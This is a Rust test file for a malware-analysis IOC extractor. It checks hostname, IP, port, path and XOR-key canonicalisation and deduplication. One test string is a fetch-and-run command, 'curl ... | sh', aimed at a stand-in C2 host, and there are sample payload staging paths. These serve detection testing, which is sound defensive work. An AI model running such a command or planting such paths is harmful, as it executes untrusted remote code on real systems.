use super::*;

fn string(value: &str, kind: Option<StringKind>, method: StringMethod) -> ExtractedString {
    ExtractedString {
        value: value.to_string(),
        data_offset: 100,
        data_len: u32::try_from(value.len()).unwrap(),
        method,
        kind,
        fragments: None,
    }
}

#[test]
fn hostname_canonicalization_requires_real_structure_and_suffix() {
    assert_eq!(
        canonicalize_hostname("C2.Example.CO.UK."),
        Some("c2.example.co.uk".to_string())
    );
    assert_eq!(
        canonicalize_hostname("BÜCHER.example"),
        None,
        ".example is reserved, not a known public suffix"
    );
    assert_eq!(canonicalize_hostname("-bad.example.com"), None);
    assert_eq!(canonicalize_hostname("bad_.example.com"), None);
    assert_eq!(canonicalize_hostname("example.unknownsuffix"), None);
    assert_eq!(canonicalize_hostname("com"), None);
}

#[test]
fn exact_untyped_bare_hostname_is_not_emitted() {
    let values = [
        string("foo.rs", None, StringMethod::RawScan),
        string("1.2.3.4", None, StringMethod::RawScan),
        string("ordinary text", None, StringMethod::RawScan),
    ];
    assert!(extract_iocs(&values).is_empty());
}

#[test]
fn exact_typed_hostname_is_canonicalized() {
    let values = [string(
        "C2.Example.COM.",
        Some(StringKind::Hostname),
        StringMethod::XorDecode,
    )];
    let got = extract_iocs(&values);
    assert_eq!(got.len(), 1);
    assert_eq!(got[0].kind, IocKind::Hostname);
    assert_eq!(got[0].value, "c2.example.com");
}

#[test]
fn endpoint_is_structural_and_port_is_metadata() {
    let values = [
        string("c2.example.com:443", None, StringMethod::RawScan),
        string("C2.EXAMPLE.COM:8443", None, StringMethod::Base64Decode),
    ];
    let got = extract_iocs(&values);
    assert_eq!(got.len(), 1);
    assert_eq!(got[0].value, "c2.example.com");
    assert_eq!(got[0].ports, vec![443, 8443]);
    assert_eq!(got[0].count, 2);
}

#[test]
fn url_authorities_are_extracted_inside_larger_strings() {
    let values = [string(
        "curl https://user:pass@C2.Example.COM:443/a | sh",
        Some(StringKind::ShellCmd),
        StringMethod::Base64Decode,
    )];
    let got = extract_iocs(&values);
    assert_eq!(got.len(), 1);
    assert_eq!(got[0].value, "c2.example.com");
    assert_eq!(got[0].ports, vec![443]);
    assert_eq!(got[0].occurrences[0].method, StringMethod::Base64Decode);
    assert_eq!(
        &values[0].value[got[0].occurrences[0].value_span[0] as usize
            ..(got[0].occurrences[0].value_span[0] + got[0].occurrences[0].value_span[1]) as usize],
        "C2.Example.COM"
    );
}

#[test]
fn ipv6_endpoint_is_canonical_and_deduplicated_with_plain_ip() {
    let values = [
        string(
            "[2606:4700:4700:0:0:0:0:1111]:443",
            Some(StringKind::IpPort),
            StringMethod::RawScan,
        ),
        string(
            "2606:4700:4700::1111",
            Some(StringKind::Ip),
            StringMethod::RawScan,
        ),
    ];
    let got = extract_iocs(&values);
    assert_eq!(got.len(), 1);
    assert_eq!(got[0].value, "2606:4700:4700::1111");
    assert_eq!(got[0].ports, vec![443]);
    assert_eq!(got[0].count, 2);
}

#[test]
fn external_ip_policy_rejects_versions_and_non_routable_ranges() {
    for accepted in [
        "45.33.32.156",
        "104.16.132.229",
        "3.147.61.167",
        "2.27.62.51",
        "208.67.222.222",
        "2606:4700:4700::1111",
    ] {
        let ip = accepted.parse().expect("valid test IP");
        assert!(
            is_external_ip(&ip, IpEvidence::Bare),
            "rejected external IP: {accepted}"
        );
    }

    for rejected in [
        "1.2.0.4",
        "8.8.8.8",
        "10.1.2.3",
        "100.64.1.1",
        "127.1.2.3",
        "169.254.1.1",
        "172.16.1.1",
        "192.168.1.1",
        "192.0.2.1",
        "198.19.1.1",
        "198.51.100.1",
        "203.0.113.1",
        "224.1.2.3",
        "240.1.2.3",
        "::1",
        "fc00::1",
        "fe80::1",
        "2001:db8::1",
        "3fff::1",
    ] {
        let ip = rejected.parse().expect("valid test IP");
        assert!(
            !is_external_ip(&ip, IpEvidence::Bare),
            "accepted non-IOC IP: {rejected}"
        );
    }

    let structural_dns = "1.1.1.1".parse().expect("valid test IP");
    assert!(!is_external_ip(&structural_dns, IpEvidence::Bare));
    assert!(is_external_ip(&structural_dns, IpEvidence::Authority));

    let private = "192.168.1.1".parse().expect("valid test IP");
    assert!(!is_external_ip(&private, IpEvidence::Authority));
}

#[test]
fn malformed_endpoints_and_url_lookalikes_are_rejected() {
    let values = [
        string("foo.rs:0", None, StringMethod::RawScan),
        string("foo.rs:65536", None, StringMethod::RawScan),
        string(
            "1.2.3.4:abc",
            Some(StringKind::IpPort),
            StringMethod::RawScan,
        ),
        string("1.2.0.4", Some(StringKind::Ip), StringMethod::RawScan),
        string(
            "http://192.168.1.1/admin",
            Some(StringKind::Url),
            StringMethod::RawScan,
        ),
        string(
            "http://203.0.113.7/test",
            Some(StringKind::Url),
            StringMethod::RawScan,
        ),
        string(
            "http://45.0.32.156/test",
            Some(StringKind::Url),
            StringMethod::RawScan,
        ),
        string("not a scheme ://example.com", None, StringMethod::RawScan),
        string(
            "http://-bad.example.com/",
            Some(StringKind::Url),
            StringMethod::RawScan,
        ),
        string(
            "http://example.unknown/",
            Some(StringKind::Url),
            StringMethod::RawScan,
        ),
    ];
    assert!(extract_iocs(&values).is_empty());
}

#[test]
fn occurrence_details_are_bounded_but_count_is_complete() {
    let values: Vec<_> = (0..20)
        .map(|_| {
            string(
                "https://example.com/",
                Some(StringKind::Url),
                StringMethod::RawScan,
            )
        })
        .collect();
    let got = extract_iocs(&values);
    assert_eq!(got[0].count, 20);
    assert_eq!(got[0].occurrences.len(), MAX_IOC_OCCURRENCES);
}

#[test]
fn structurally_typed_xor_keys_are_lossless_and_deduplicated() {
    let values = [
        string("secret", Some(StringKind::XorKey), StringMethod::RawScan),
        string(
            "0x736563726574",
            Some(StringKind::XorKey),
            StringMethod::XorStackPair,
        ),
    ];
    let got = extract_iocs(&values);
    assert_eq!(got.len(), 1);
    assert_eq!(got[0].kind, IocKind::Key);
    assert_eq!(got[0].value, encode_key_material(b"secret"));
    assert_eq!(decode_key_material(&got[0].value), Some(b"secret".to_vec()));
    assert_eq!(got[0].count, 2);
    assert_eq!(
        got[0].key,
        Some(KeyMetadata {
            algorithms: vec![KeyAlgorithm::Xor],
            bytes: 6,
        })
    );

    let json = serde_json::to_string(&got).unwrap();
    assert!(json.contains(r#""value":"base64url:c2VjcmV0""#));
    assert!(
        !json.contains("secret"),
        "binary key material was not JSON-safe encoded"
    );
    assert!(
        !json.contains("736563726574"),
        "hex key material leaked into JSON"
    );
}

#[test]
fn key_material_encoding_is_canonical() {
    let binary = [0xfb, 0xff, 0x00, 0x7f];
    let encoded = encode_key_material(&binary);
    assert_eq!(encoded, "base64url:-_8Afw");
    assert_eq!(decode_key_material(&encoded), Some(binary.to_vec()));
    assert_eq!(decode_key_material("base64url:"), None);
    assert_eq!(decode_key_material("base64url:c2VjcmV0="), None);
    assert_eq!(decode_key_material("base64url:AB"), None);
    assert_eq!(decode_key_material("sha256:c2VjcmV0"), None);
}

#[test]
fn key_shape_without_structural_evidence_is_not_emitted() {
    let values = [
        string(
            "fYztZORL5VNS7nCUH1ktn5UoJ8VSgaf",
            None,
            StringMethod::RawScan,
        ),
        string(
            "MDEyMzQ1Njc4OWFiY2RlZjAxMjM0NTY3ODlhYmNkZWY=",
            Some(StringKind::Base64),
            StringMethod::RawScan,
        ),
    ];
    assert!(extract_iocs(&values).is_empty());
}

#[test]
fn path_canonicalization_is_absolute_minimal_and_conservative() {
    assert_eq!(
        canonicalize_ioc_path("/tmp/.stage-9f3a/payload.bin"),
        Some("/tmp/.stage-9f3a/payload.bin".to_string())
    );
    assert_eq!(
        canonicalize_ioc_path(r"c:\Users\Public\svchost.dat"),
        Some(r"C:\Users\Public\svchost.dat".to_string())
    );
    assert_eq!(
        canonicalize_ioc_path(r"\\host\share\stage\payload.dat"),
        Some(r"\\host\share\stage\payload.dat".to_string())
    );

    for rejected in [
        "/bin/sh",
        "/usr/bin/python3",
        r"C:\Windows\System32\cmd.exe",
        "/build/project/src/main.rs",
        "/opt/homebrew/Cellar/go/1.25.6/libexec/src/runtime/runtime-gdb.py",
        "./relative/payload.bin",
        "/Applications",
        "/CBx",
        "/tmp/stage/",
        "/tmp/$USER/payload",
        "/tmp/payload-%s",
        "/tmp/*.dat",
        "/dev/urandom7K'UmU",
        "/dev/uraL9",
        "/etc/hosts",
        "/proc/sys/kernel/hostname",
        "/root/go/go1.16.6",
        "/usr/share/mime/globs2",
        "/Users/cosmanking/.cargo/registry/src/index.crates.io/hash/src/lib.rsmessage",
        "/Drivers/etc/hosts",
        "/System/Library/Frameworks/Cocoa.framework/Versions/A/Cocoa",
        "/usr/lib/libSystem.B.dylib",
        "/root/openssl-prefix/ssl/cert.pem",
        "/http://example.com/cert.crl",
    ] {
        assert_eq!(
            canonicalize_ioc_path(rejected),
            None,
            "unexpected path IOC: {rejected}"
        );
    }
}

#[test]
fn typed_full_paths_deduplicate_but_source_paths_and_common_tools_do_not_emit() {
    let values = [
        string(
            "/tmp/.stage-9f3a/payload.bin",
            Some(StringKind::SuspiciousPath),
            StringMethod::RawScan,
        ),
        string(
            "/tmp/.stage-9f3a/payload.bin",
            Some(StringKind::Path),
            StringMethod::Base64Decode,
        ),
        string(
            "/home/builder/src/main.rs",
            Some(StringKind::FilePath),
            StringMethod::PclntabSymbol,
        ),
        string("/bin/bash", Some(StringKind::Path), StringMethod::RawScan),
    ];
    let got = extract_iocs(&values);
    assert_eq!(got.len(), 1);
    assert_eq!(got[0].kind, IocKind::Path);
    assert_eq!(got[0].value, "/tmp/.stage-9f3a/payload.bin");
    assert_eq!(got[0].count, 2);
    assert!(
        got[0]
            .occurrences
            .iter()
            .any(|occurrence| occurrence.method == StringMethod::Base64Decode)
    );
}
